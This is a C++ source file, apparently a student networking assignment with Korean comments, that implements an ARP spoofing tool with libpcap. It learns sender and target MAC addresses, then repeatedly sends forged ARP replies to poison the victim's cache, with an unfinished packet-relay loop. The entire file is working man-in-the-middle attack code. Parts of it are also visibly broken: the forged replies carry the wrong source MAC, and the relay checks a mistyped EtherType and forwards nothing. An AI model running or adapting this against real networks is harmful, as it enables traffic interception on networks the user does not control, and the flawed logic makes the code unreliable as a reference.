#include <cstdio>
#include <pcap.h>
#include "mylibnet.h"
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <stdint.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <iostream>
#include <vector>
#include <algorithm>
#include <fstream>
#include <map>
using namespace std;
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

vector<pair<string,string>> sender_target_ip_pair;
map<string,string> ip_mac_pair;


void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

void sendArpPacket(string dmac,string smac,string sip,string tmac,string tip,pcap_t *handle,u_int16_t type){
    EthArpPacket packet;
	packet.eth_.dmac_ = Mac(dmac);
	packet.eth_.smac_ = Mac(smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(type);
	packet.arp_.smac_ = Mac(smac);
	packet.arp_.sip_ = htonl(Ip(sip));
	packet.arp_.tmac_ = Mac(tmac);
	packet.arp_.tip_ = htonl(Ip(tip));
    //send ARP packet
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2!=0) {
		usage();
		return -1;
	}

	for(int i=2;i<argc-1;i+=2){
		string sender_ip(argv[i]);
		string target_ip(argv[i+1]);
		sender_target_ip_pair.push_back({sender_ip,target_ip});
	}

	char* dev = argv[1];

    string my_mac_addr;
    string my_ip_addr;
    //나의 mac주소 구하기  
	string interface(dev);
	string my_mac_filpath = "/sys/class/net/"+interface+"/address";
	ifstream ifs(my_mac_filpath);
	ifs>>my_mac_addr;
	for(int i=0;i<my_mac_addr.size();i++){
		my_mac_addr[i]=toupper(my_mac_addr[i]);
	}
	ifs.close();
	//나의 ip주소 구하기 --> 이건 chatGPT 도움을 좀 받았습니다.
	struct ifaddrs* ifAddrList = nullptr;
    struct ifaddrs* ifa = nullptr;
	char ipAddress[INET6_ADDRSTRLEN];
    // getifaddrs() 함수를 사용하여 네트워크 인터페이스 목록을 가져옵니다.
    if (getifaddrs(&ifAddrList) == -1) {
        std::cerr << "Failed to get interface list" << std::endl;
        return 1;
    }
    // 인터페이스 목록을 순회하면서 IP 주소를 확인합니다.
    for (ifa = ifAddrList; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr) {
            continue;
        }
        // 해당 인터페이스의 이름이 "ens33"인 경우에만 처리
        if (strcmp(ifa->ifa_name, dev) == 0) {
            // AF_INET 또는 AF_INET6 주소만 고려합니다.
            if (ifa->ifa_addr->sa_family == AF_INET || ifa->ifa_addr->sa_family == AF_INET6) {
                void* addrPtr;
                if (ifa->ifa_addr->sa_family == AF_INET) {
                    addrPtr = &((struct sockaddr_in*)ifa->ifa_addr)->sin_addr;
                } else {
                    addrPtr = &((struct sockaddr_in6*)ifa->ifa_addr)->sin6_addr;
                }
                // IP 주소를 문자열로 변환합니다.
                inet_ntop(ifa->ifa_addr->sa_family, addrPtr, ipAddress, INET6_ADDRSTRLEN);
                my_ip_addr = ipAddress;
                break; // ens33 인터페이스를 찾았으므로 루프를 빠져나갑니다.
            }
        }
    }
    //메모리 해제
    freeifaddrs(ifAddrList);
	my_ip_addr = ipAddress;
	//ARP Request로 mac주소 질의 
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 1024, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}


	for(int i=0;i<sender_target_ip_pair.size();i++){
		const string sender_ip = sender_target_ip_pair[i].first;
		const string target_ip = sender_target_ip_pair[i].second;
		//sender의 mac주소 질의
		sendArpPacket("FF:FF:FF:FF:FF:FF",my_mac_addr,my_ip_addr,"00:00:00:00:00:00",sender_ip,handle,1);
		while(true){
			const u_char* packet;
			struct pcap_pkthdr* header;
			int res = pcap_next_ex(handle, &header, &packet);
			struct EthArpPacket *etharphdr = (struct EthArpPacket*)packet;
			struct EthHdr ethhdr = etharphdr->eth_;
			struct ArpHdr arphdr = etharphdr->arp_;
			if(ntohs(ethhdr.type_)!=0x0806) continue;
			Ip s_ip = ntohl(arphdr.sip_);
			Mac s_mac = arphdr.smac_;
			Ip t_ip = ntohl(arphdr.tip_);
			Mac t_mac = arphdr.tmac_;
			if(string(s_ip)==sender_ip && string(t_mac)==my_mac_addr){
				ip_mac_pair[sender_ip]=string(s_mac);
				cout<<string(s_mac)<<endl;
				break;
			}
		}
		

		//target의 mac주소 질의
		sendArpPacket("FF:FF:FF:FF:FF:FF",my_mac_addr,my_ip_addr,"00:00:00:00:00:00",target_ip,handle,1);

			
		while(true){
			const u_char* packet;
			struct pcap_pkthdr* header;
			int res = pcap_next_ex(handle, &header, &packet);
			struct EthArpPacket *etharphdr = (struct EthArpPacket*)packet;
			struct EthHdr ethhdr = etharphdr->eth_;
			struct ArpHdr arphdr = etharphdr->arp_;
			if(ntohs(ethhdr.type_)!=0x0806) continue;
			Ip s_ip = ntohl(arphdr.sip_);
			Mac s_mac = arphdr.smac_;
			Ip t_ip = ntohl(arphdr.tip_);
			Mac target_mac = arphdr.tmac_;
			if(string(s_ip)==target_ip && string(target_mac)==my_mac_addr){
				ip_mac_pair[target_ip]=string(s_mac);
				cout<<string(s_mac)<<endl;
				break;
			}
		}
	}

	cout<<"fd"<<endl;
	while(true){
		//ARP infection 
		for(int i=0;i<sender_target_ip_pair.size();i++){
			string sender_ip = sender_target_ip_pair[i].first;
			string target_ip = sender_target_ip_pair[i].second;
			string sender_mac = ip_mac_pair[sender_ip];
			string target_mac = ip_mac_pair[target_ip];
			sendArpPacket(sender_mac,target_mac,target_ip,sender_mac,sender_ip,handle,2);
		}
		//relay packets 
		const u_char* packet;
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(handle, &header, &packet);
		struct libnet_ether_hdr *ethhdr = (struct libnet_ether_hdr*)packet;
		if(ntohs(ethhdr->type)!=0x0080) continue;
	}
	pcap_close(handle);
}
